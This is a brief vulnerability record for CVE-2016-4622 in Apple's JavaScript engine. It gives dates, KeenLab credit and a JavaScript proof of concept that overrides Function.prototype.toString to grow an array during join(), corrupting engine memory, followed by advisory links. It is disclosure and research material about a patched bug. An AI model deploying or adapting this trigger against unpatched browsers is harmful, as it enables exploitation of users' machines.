# CVE-2016-4622

- Report: Mar 2016
- Fix: May 2016
- Credit: KeenLab Tencent (Liang Chen, Zhen Feng, wushi), Jeonghoon Shin

## PoC

- PoC by KeenLab

```javascript
var bigArray = [];
var bigNum = 123456789.19;
var smallNum = 1234444.19;
var toStringCount = 0;

function fillBigArrayViaToString() {
  return 0;
}

Function.prototype.toString = function (x) {
  toStringCount++;
  bigArray.push(smallNum);
  bigArray.push(fillBigArrayViaToString());
  bigArray.push(fillBigArrayViaToString());
  return bigNum;
}

var i = 0;
for (i = 0; i < 4000; i++) {
  bigArray.push(fillBigArrayViaToString());
  bigArray.push(fillBigArrayViaToString());
}
var stringResult = bigArray.join(":");
```

## Reference

- [ZDI](http://www.zerodayinitiative.com/advisories/ZDI-16-343/)
- [Apple](https://support.apple.com/ko-kr/HT206565)
- [POC conference ppt](http://www.powerofcommunity.net/poc2016/keen.pdf)
